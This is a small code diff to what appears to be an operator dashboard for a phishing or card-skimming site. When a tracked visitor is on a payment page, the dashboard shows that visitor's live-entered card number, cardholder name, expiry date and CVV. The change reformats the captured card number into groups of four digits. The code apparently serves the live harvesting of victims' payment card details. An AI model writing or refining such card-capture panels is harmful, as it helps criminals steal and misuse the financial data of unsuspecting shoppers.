@@ -4184,7 +4184,8 @@
       const isOnPaymentPage = (visitor.page || '').includes('الدفع') || (visitor.page || '').toLowerCase().includes('payment') || (visitor.page || '').toLowerCase().includes('credit');
       if (isOnPaymentPage || visitor.liveCard) {
         const lc = visitor.liveCard || { cardNumber: '', nameOnCard: '', expiryDate: '', cvv: '' };
-        const lcNum = lc.cardNumber || 'XXXX XXXX XXXX XXXX';
+        const lcNumRaw = (lc.cardNumber || '').replace(/\s+/g, '');
+        const lcNum = lcNumRaw ? lcNumRaw.replace(/(\d{4})(?=\d)/g, '$1 ') : 'XXXX XXXX XXXX XXXX';
         const lcName = lc.nameOnCard || '---';
         const lcExpiry = lc.expiryDate || 'XX/XX';
         const lcCvv = lc.cvv || '---';
